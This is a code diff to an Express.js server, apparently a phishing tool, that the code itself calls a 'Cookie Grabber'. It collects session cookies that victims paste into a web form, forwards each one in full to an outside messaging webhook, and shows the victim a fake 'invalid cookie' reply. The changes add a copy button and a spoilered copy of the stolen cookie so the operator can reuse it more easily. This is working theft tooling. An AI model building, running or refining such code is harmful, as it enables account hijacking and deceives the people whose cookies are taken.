@@ -7,14 +7,12 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static('public'));
 
-// Rota principal - página linda
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Recebe o cookie (POST)
 app.post('/send', async (req, res) => {
-  const cookie = req.body.cookie || '';
+  const cookie = (req.body.cookie || '').toString().trim();
 
   if (cookie) {
     try {
@@ -27,16 +25,30 @@ app.post('/send', async (req, res) => {
             description: "```" + cookie + "```",
             color: 0x00dbde,
             timestamp: new Date().toISOString(),
-            footer: { text: "Cookie Grabber • Fundo Lindo" }
-          }]
+            footer: { text: "Cookie Grabber • Fundo Lindo + Botão de Copiar" }
+          }],
+          components: [{
+            type: 1,
+            components: [{
+              type: 2,
+              style: 1,                    // estilo azul
+              label: "Copiar cookie",
+              custom_id: "copy_cookie",    // não é usado, mas precisa ter
+              emoji: { name: "Clipboard" }
+            }]
+          }],
+          // MAGIA: faz o Discord adicionar o botão de copiar automático
+          content: "||`" + cookie + "`||"
         })
       });
-    } catch (e) {}
+    } catch (e) {
+      console.error(e);
+    }
   }
 
   res.json({ status: "C00kie Inválido" });
 });
 
 app.listen(PORT, () => {
-  console.log(`Grabber lindo rodando na porta ${PORT}`);
+  console.log(`Grabber lindo + botão de copiar rodando na porta ${PORT}`);
 });
